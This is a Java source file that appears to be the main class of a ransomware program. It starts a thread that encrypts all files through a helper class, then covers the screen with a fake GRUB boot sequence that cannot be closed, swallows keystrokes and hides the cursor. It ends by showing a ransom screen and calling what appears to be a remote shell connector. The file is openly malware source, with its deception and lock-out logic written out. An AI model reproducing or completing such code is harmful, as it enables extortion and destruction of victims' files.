

import Decryptor.DirectoryFinder;

import javax.swing.*;
import java.awt.*;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.awt.image.BufferedImage;
import java.util.Random;


public class GrubLoader implements KeyListener{

    @Override
    public void keyTyped(KeyEvent e) {
        System.out.println("Key typed: "+e.getKeyChar());
    }

    @Override
    public void keyPressed(KeyEvent e) {
        System.out.println("Key pressed: "+e.getKeyCode());
    }

    @Override
    public void keyReleased(KeyEvent e) {
        System.out.println("Key released: "+e.getKeyCode());
    }

    public static void main(String[] args) throws InterruptedException {

        Thread FileEncryptor = new Thread(() -> {
            System.out.println("Starting to encrypt files");
            DirectoryFinder.encryptAllFiles();

        });

        FileEncryptor.start();

        String[] messages = {
                "Loading...",
                "Welcome to GRUB!",
                "[    0.000000] Booting ...",
                "[    0.000312] Loading initial ramdisk",
                "[    0.001024] Detecting disks...",
                "[    0.001832] Found disk: hd0",
                "[    0.002316] Loading"
        };

        JFrame Grub = new JFrame();
        Grub.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        Grub.setExtendedState(JFrame.MAXIMIZED_BOTH);
        Grub.getContentPane().setBackground(Color.black);
        Grub.setUndecorated(true);
        Grub.setResizable(false);
        Grub.setVisible(true);

        // Track Key Input
        Grub.addKeyListener(new KeyAdapter() {
            @Override
            public void keyPressed(KeyEvent e) {
                e.consume();

                // Keystroke output for testing
                //System.out.println("Key event consumed, key code: " + e.getKeyCode());
                //int keyCode = e.getKeyCode();
                //System.out.println("Key event consumed, key code: " + keyCode);
                //String key = KeyEvent.getKeyText(keyCode);
                //System.out.println("Decoded key: " + key);
            }
        });

        JTextArea terminal = new JTextArea();
        terminal.setEditable(false);
        terminal.setFocusable(false);
        terminal.setBackground(Color.BLACK);
        terminal.setForeground(Color.white);
        terminal.setFont(new Font("Monospaced", Font.PLAIN, 22));
        terminal.setMargin(new Insets(20, 20, 20, 20));

        JScrollPane scrollPane = new JScrollPane(terminal);
        scrollPane.setBorder(null);
        scrollPane.getViewport().setBackground(Color.BLACK);
        scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_NEVER);
        scrollPane.setWheelScrollingEnabled(false);

        Grub.add(scrollPane, BorderLayout.CENTER);
        Grub.setVisible(true);

        BufferedImage transparentImage = new BufferedImage(16, 16, BufferedImage.TYPE_INT_ARGB);

        Cursor blankCustomCursor = Toolkit.getDefaultToolkit().createCustomCursor(
        transparentImage, new Point(0, 0), "blank cursor");
        Grub.getContentPane().setCursor(blankCustomCursor);

        for (int i = 0; i < messages.length; i++) {
            terminal.append(messages[i] + "\n");
            terminal.setCaretPosition(terminal.getDocument().getLength());
            Thread.sleep(1500);

        }

        double Loading = 0.002316;

        while (Loading <= 100){

            Random r = new Random();
            double randomValue = 0.140251 + (5.000000 - 0.140251) * r.nextDouble();

            if (Loading + randomValue >= 100){
                break;
            }

            System.out.println(String.format("[    %.6f] Loading", Loading));
            terminal.append(String.format("[    %.6f] Loading", Loading)+ "\n");
            Loading += randomValue;

            terminal.setCaretPosition(terminal.getDocument().getLength());

            //Randomised time for realism
            //double time = 1000 + (5000 - 1000) * r.nextDouble();
            //Thread.sleep((long) time);

        }

        System.out.println("[    100.000000] Loading");
        terminal.append("[    100.000000] Loading\n");

        Thread.sleep(1000);

        //flash warning
        terminal.setBackground(Color.WHITE);
        Thread.sleep(50);
        terminal.setBackground(Color.BLACK);

        terminal.setText("_");

        terminal.setFont(new Font("Monospaced", Font.PLAIN, 32));
        terminal.setMargin(new Insets(20, 20, 20, 20));

        Thread.sleep(1500);

        for (int i = 0; i <= 3; i++) {

            terminal.setText("");
            Thread.sleep(600);
            terminal.setText("_");

        }
        terminal.setText("");

        Thread.sleep(1000);
        Grub.dispose();

        //Shoe ransom screen
        GUI gui = new GUI(600, 400);
        gui.setUpGUI();
        gui.setUpButtonListeners();
        gui.runShellConnector();
    }

}
